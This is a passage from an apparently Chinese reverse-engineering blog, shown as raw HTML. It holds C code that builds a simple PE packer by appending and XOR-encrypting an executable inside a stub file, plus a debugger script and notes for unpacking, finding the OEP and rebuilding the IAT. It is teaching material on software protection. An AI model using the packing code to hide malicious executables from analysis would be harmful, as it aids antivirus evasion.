class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"114\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">VirtualFree</span><span class=\"token punctuation\">(</span>pShellBase<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> MEM_DECOMMIT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>        <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre>            <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VirtualFree pShellBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre>    <span class=\"token keyword\">return</span> bRet<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"122\"></td><td><pre> </pre></td></tr><tr><td data-num=\"123\"></td><td><pre>BOOL <span class=\"token function\">AddSection</span><span class=\"token punctuation\">(</span>PVOID pShellBase<span class=\"token punctuation\">,</span> PVOID pOrgBase<span class=\"token punctuation\">,</span> DWORD dwShellFileSize<span class=\"token punctuation\">,</span> DWORD dwOrgFileSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre>    BOOL bRet <span class=\"token operator\">=</span> TRUE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>    DWORD dwRet <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>    HANDLE hFile <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre>    PIMAGE_DOS_HEADER pShellDosHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_DOS_HEADER<span class=\"token punctuation\">)</span>pShellBase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre>    PIMAGE_FILE_HEADER pShellFileHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_FILE_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pShellBase <span class=\"token operator\">+</span> pShellDosHead<span class=\"token operator\">-></span>e_lfanew <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    PIMAGE_OPTIONAL_HEADER32 pShellOptionHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_OPTIONAL_HEADER32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pShellFileHead <span class=\"token operator\">+</span> IMAGE_SIZEOF_FILE_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre>    PIMAGE_SECTION_HEADER pShellSectionHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_SECTION_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pShellOptionHead <span class=\"token operator\">+</span> pShellFileHead<span class=\"token operator\">-></span>SizeOfOptionalHeader<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre>    DWORD dwFileAlignment <span class=\"token operator\">=</span> pShellOptionHead<span class=\"token operator\">-></span>FileAlignment<span class=\"token punctuation\">,</span> dwSectionAlignment <span class=\"token operator\">=</span> pShellOptionHead<span class=\"token operator\">-></span>SectionAlignment<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>    DWORD dwSize <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>    PVOID pResBase <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre> </pre></td></tr><tr><td data-num=\"136\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pShellSectionHead<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>PointerToRawData <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>pShellSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pShellBase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>                                    <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> IMAGE_SIZEOF_SECTION_HEADER<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"壳子最后一个节表间隙不够\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"144\"></td><td><pre>    dwSize <span class=\"token operator\">=</span> <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>dwOrgFileSize <span class=\"token operator\">+</span> dwShellFileSize<span class=\"token punctuation\">,</span> dwFileAlignment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//dwFileAlignment 整数倍</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    pResBase <span class=\"token operator\">=</span> <span class=\"token function\">VirtualAlloc</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> dwSize<span class=\"token punctuation\">,</span> MEM_COMMIT <span class=\"token operator\">|</span> MEM_RESERVE<span class=\"token punctuation\">,</span> PAGE_READWRITE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>pResBase<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"VirtualAlloc pResBase\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre> </pre></td></tr><tr><td data-num=\"153\"></td><td><pre>    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span>pResBase<span class=\"token punctuation\">,</span> dwSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PVOID<span class=\"token punctuation\">)</span>pResBase<span class=\"token punctuation\">,</span> pShellBase<span class=\"token punctuation\">,</span> dwShellFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将源文件复制到壳子中</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PVOID<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pResBase <span class=\"token operator\">+</span> dwShellFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> pOrgBase<span class=\"token punctuation\">,</span> dwOrgFileSize<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 将源文件复制到壳子中</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"157\"></td><td><pre>    PIMAGE_DOS_HEADER pResDosHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_DOS_HEADER<span class=\"token punctuation\">)</span>pResBase<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>    PIMAGE_FILE_HEADER pResFileHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_FILE_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pResBase <span class=\"token operator\">+</span> pResDosHead<span class=\"token operator\">-></span>e_lfanew <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>    PIMAGE_OPTIONAL_HEADER32 pResOptionHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_OPTIONAL_HEADER32<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pResFileHead <span class=\"token operator\">+</span> IMAGE_SIZEOF_FILE_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>    PIMAGE_SECTION_HEADER pResSectionHead <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>PIMAGE_SECTION_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>DWORD<span class=\"token punctuation\">)</span>pResOptionHead <span class=\"token operator\">+</span> pResFileHead<span class=\"token operator\">-></span>SizeOfOptionalHeader<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>     </pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    <span class=\"token comment\">// 增加节表</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    <span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>PVOID<span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>pResSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> IMAGE_SIZEOF_SECTION_HEADER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Name<span class=\"token punctuation\">,</span> <span class=\"token string\">\".1900\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".1900\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>PointerToRawData <span class=\"token operator\">=</span> pResSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>PointerToRawData</pre></td></tr><tr><td data-num=\"166\"></td><td><pre>                                                                           <span class=\"token operator\">+</span> <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>pShellSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>SizeOfRawData<span class=\"token punctuation\">,</span> dwFileAlignment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>    pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>SizeOfRawData <span class=\"token operator\">=</span> <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>dwOrgFileSize<span class=\"token punctuation\">,</span> dwFileAlignment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>    pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>VirtualAddress <span class=\"token operator\">=</span> pResSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>VirtualAddress</pre></td></tr><tr><td data-num=\"169\"></td><td><pre>                                                                            <span class=\"token operator\">+</span> <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>pResSectionHead<span class=\"token punctuation\">[</span>pShellFileHead<span class=\"token operator\">-></span>NumberOfSections <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Misc<span class=\"token punctuation\">.</span>VirtualSize<span class=\"token punctuation\">,</span> dwSectionAlignment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>    pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Misc<span class=\"token punctuation\">.</span>VirtualSize <span class=\"token operator\">=</span> dwOrgFileSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>    pResSectionHead<span class=\"token punctuation\">[</span>pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>Characteristics <span class=\"token operator\">|=</span> IMAGE_SCN_MEM_READ<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre> </pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    pResFileHead<span class=\"token operator\">-></span>NumberOfSections<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 增加节数量</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>    pResOptionHead<span class=\"token operator\">-></span>SizeOfImage <span class=\"token operator\">+=</span> <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>dwOrgFileSize<span class=\"token punctuation\">,</span> dwSectionAlignment<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">// 增加 SizeOfImage</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre> </pre></td></tr><tr><td data-num=\"176\"></td><td><pre>    hFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFile</span><span class=\"token punctuation\">(</span>TARGET_FILE_NAME<span class=\"token punctuation\">,</span>      <span class=\"token comment\">// 打开目标文件并保存</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>                       GENERIC_READ <span class=\"token operator\">|</span> GENERIC_WRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>                       <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>                       CREATE_ALWAYS<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>                       FILE_ATTRIBUTE_NORMAL<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>                       <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre> </pre></td></tr><tr><td data-num=\"183\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hFile <span class=\"token operator\">==</span> INVALID_HANDLE_VALUE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"CreateFile\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre> </pre></td></tr><tr><td data-num=\"190\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">WriteFile</span><span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">,</span> pResBase<span class=\"token punctuation\">,</span> dwSize<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>dwRet<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"191\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre>        <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"WriteFile\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>        bRet <span class=\"token operator\">=</span> FALSE<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"194\"></td><td><pre>        <span class=\"token keyword\">goto</span> exit<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre> </pre></td></tr><tr><td data-num=\"197\"></td><td><pre>exit<span class=\"token operator\">:</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">)</span> <span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>hFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>    <span class=\"token keyword\">return</span> bRet<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre> </pre></td></tr><tr><td data-num=\"202\"></td><td><pre>DWORD <span class=\"token function\">Align</span><span class=\"token punctuation\">(</span>DWORD dwSize<span class=\"token punctuation\">,</span> DWORD dwAlign<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"203\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    <span class=\"token keyword\">return</span> dwSize <span class=\"token operator\">%</span> dwAlign <span class=\"token operator\">?</span> dwSize <span class=\"token operator\">+</span> dwAlign <span class=\"token operator\">-</span> dwSize <span class=\"token operator\">%</span> dwAlign <span class=\"token operator\">:</span> dwSize<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre> </pre></td></tr><tr><td data-num=\"207\"></td><td><pre>VOID <span class=\"token function\">EncpyptFile</span><span class=\"token punctuation\">(</span>PUCHAR pBaseAddr<span class=\"token punctuation\">,</span> DWORD dwFileSize<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>    DWORD i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre>    UCHAR uKey <span class=\"token operator\">=</span> <span class=\"token number\">190</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\">// 加密密钥</span></pre></td></tr><tr><td data-num=\"211\"></td><td><pre> </pre></td></tr><tr><td data-num=\"212\"></td><td><pre>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> dwFileSize<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>pBaseAddr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> pBaseAddr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> uKey<span class=\"token punctuation\">)</span> pBaseAddr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^=</span> uKey<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre> </pre></td></tr><tr><td data-num=\"218\"></td><td><pre>VOID <span class=\"token function\">ShowError</span><span class=\"token punctuation\">(</span>PCHAR msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>    CHAR szError<span class=\"token punctuation\">[</span><span class=\"token number\">105</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre> </pre></td></tr><tr><td data-num=\"222\"></td><td><pre>    <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span>szError<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%s Error %d\"</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">,</span> <span class=\"token function\">GetLastError</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"223\"></td><td><pre>    <span class=\"token function\">MessageBox</span><span class=\"token punctuation\">(</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> szError<span class=\"token punctuation\">,</span> <span class=\"token function\">TEXT</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> MB_OK<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"224\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">!</span><span class=\"token operator\">--</span>code￼<span class=\"token number\">75</span><span class=\"token operator\">--</span><span class=\"token operator\">></span></pre></td></tr></table></figure></li>\n</ol>\n<p>/ 1. 定义变量<br>\n MOV dwOEP,0047148B<br>\nMOV dwGetAPI,001E1914<br>\nMOV dwWriteIAT,001E0897</p>\n<p>// 2. 清除环境<br>\n BC    // 清除所有软件断点<br>\n BPHWC // 清除所有硬件断点<br>\n BPMC  // 清除内存断点</p>\n<p>// 3. 设置断点<br>\n BPHWS dwOEP, “x” // 当执行到此地址时产生中断.<br>\nBPHWS dwGetAPI, “x” // 当执行到此地址时产生中断.<br>\nBPHWS dwWriteIAT, “x” // 当执行到此地址时产生中断.</p>\n<p>// 4. 循环<br>\n LOOP0:<br>\nRUN // F9<br>\nCMP dwGetAPI,eip<br>\nJNZ CASE1<br>\nMOV dwTMP,eax<br>\nJMP LOOP0<br>\nCASE1:<br>\nCMP dwWriteIAT,eip<br>\nJNZ CASE2<br>\nMOV [edx],dwTMP       //MOV DWORD PTR DS:[EDX],EAX<br>\nJMP LOOP0<br>\nCASE2:<br>\nCMP dwOEP,eip<br>\nJNZ LOOP0<br>\nMSG “OEP 已到达”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">#### 通过脱壳脚本之(修复IAT表)</span><br><span class=\"line\"></span><br><span class=\"line\">1. 生成加密的IAT函数大概步骤如下：</span><br><span class=\"line\"></span><br><span class=\"line\">2. 获取原始IAT函数地址，存放在一定位置</span><br><span class=\"line\"></span><br><span class=\"line\">3. 使用LoadLibraryA/W,GetProcAddress函数</span><br><span class=\"line\"></span><br><span class=\"line\">4. 申请空间，构造新的IAT函数</span><br><span class=\"line\"></span><br><span class=\"line\">5. 使用VirtualAlloc申请空间，拷贝代码</span><br><span class=\"line\"></span><br><span class=\"line\">6. 根据原始IAT函数地址计算加密值，隐藏真实地址</span><br><span class=\"line\"></span><br><span class=\"line\">7. 计算类似GetVersion函数中的代码中的x值</span><br><span class=\"line\"></span><br><span class=\"line\">8. sub edx,x;</span><br><span class=\"line\"></span><br><span class=\"line\">9. add ebc,x;</span><br><span class=\"line\"></span><br><span class=\"line\">10. 将新IAT函数地址写入IAT</span><br><span class=\"line\"></span><br><span class=\"line\">11. 填充地址到IAT</span><br><span class=\"line\"></span><br><span class=\"line\">12. 至此，我们已经知道程序在写入一个IAT函数地址时的操作过程，概括为以下步骤。</span><br><span class=\"line\">     1.获取预先计算好的hash值</span><br><span class=\"line\">     2.循环获取当前正在获取的模块中的导出函数名称，计算hash值，与预存的比较，如果失败继续循环获取</span><br><span class=\"line\">     3.如果正确，获取导出函数的地址</span><br><span class=\"line\">     